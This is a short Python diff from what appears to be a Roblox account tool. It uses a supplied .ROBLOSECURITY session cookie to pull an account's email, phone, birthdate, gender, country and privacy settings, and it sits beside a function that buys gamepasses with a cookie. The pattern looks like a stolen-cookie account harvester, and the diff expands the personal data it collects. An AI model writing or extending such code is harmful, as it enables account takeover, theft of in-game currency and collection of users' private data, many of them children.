@@ -69,7 +69,20 @@ def buy_gamepass(url,cookie):
         print(f'POST request failed with status code {response.status_code}')
 
 def get_roblox_data(robloxcookie):
-    urls=['https://accountsettings.roblox.com/v1/email','https://accountinformation.roblox.com/v1/birthdate','https://accountinformation.roblox.com/v1/phone']
+    urls=['https://accountinformation.roblox.com/v1/description',
+          'https://accountinformation.roblox.com/v1/gender',
+          'https://accountsettings.roblox.com/v1/email',
+          'https://accountinformation.roblox.com/v1/phone',
+          'https://accountinformation.roblox.com/v1/birthdate',
+          'https://accountinformation.roblox.com/v1/phone',
+          'https://accountsettings.roblox.com/v1/account/settings/account-country',
+          'https://accountsettings.roblox.com/v1/account/settings/metadata',
+          'https://accountsettings.roblox.com/v1/app-chat-privacy',
+          'https://accountsettings.roblox.com/v1/game-chat-privacy',
+          'https://accountsettings.roblox.com/v1/inventory-privacy',
+          'https://accountsettings.roblox.com/v1/private-message-privacy',
+          'https://accountsettings.roblox.com/v1/trade-privacy',
+          'https://accountinformation.roblox.com/v1/promotion-channels']
     session = requests.Session()
     session.cookies['.ROBLOSECURITY'] = robloxcookie
 
